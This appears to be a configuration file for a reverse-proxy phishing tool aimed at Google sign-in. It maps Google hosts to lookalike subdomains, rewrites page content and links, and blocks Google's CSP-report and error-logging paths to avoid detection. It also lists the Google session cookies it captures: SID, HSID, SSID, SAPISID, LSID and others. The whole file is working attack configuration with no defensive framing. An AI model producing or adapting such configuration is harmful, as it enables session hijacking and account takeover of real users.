#! /usr/bin/env python3

hostname = 'accounts.google.com'
isSSL    = True
server   = 'localhost'
port     = 443
domain   = server if port in [443,80] else '{}:{}'.format(server,port)

inject_domain = [
    ['apis.google.com','apis.'+domain],
    ['ssl.gstatic.com', 'ssl.'+domain],
    ['accounts.youtube.com', 'youtube.'+domain],
    ['content.googleapis.com', 'content.'+domain],
    ['accounts.google.com', 'accounts.'+domain],
    ['www.google.com', 'www.'+domain],
    ['myaccount.google.com', 'myaccount.'+domain],
]

req_headers = [
    ['', {'Connection':'close'}],
    ['/js/base.js', {'Host':'apis.google.com'}],
    ['_/scs/apps-static', {'Host':'apis.google.com'}],
    ['/cryptauth/v1/authzen/awaittx', {'Host':'content.googleapis.com'}],
    ['/accounts/static/_/js', {'Host':'ssl.gstatic.com'}],
    ['/accounts/embedded/', {'Host':'ssl.gstatic.com'}],
    ['/accounts/embedded/', {'Host':'ssl.gstatic.com'}],
    ['/CheckConnection', {'Host':'accounts.youtube.com'}],
    ['favicon.ico', {'Host':'www.google.com'}]
]

resp_headers = [
]

req_body = [
]

resp_body = [
    # # ['', 'https', 'http'],
    ['', 'https://play.google.com/log?format=json&hasfast=true', '//'],
    ['/', 'Sign in', 'FAkE GoOglE'],
    ['/js/base.js','google(rs)?\.com', domain],
    ['', 'accounts.'+domain+'/CheckCookie','google.com'],
]

block_paths = [
    '/cspreport',
    '/signin/v2/_/common/diagnostics/',
    '/_/common/diagnostics/',
    '/log',
    '/jserror',
    '/signin/v2/jserror',
    'CheckConnection',
]

get_cookie = [
    'SID',
    'HSID',
    'SSID',
    'APISID',
    'SAPISID',
    'NID',
    'GAPS',
    'LSID',
    'ACCOUNT_CHOOSER',
]

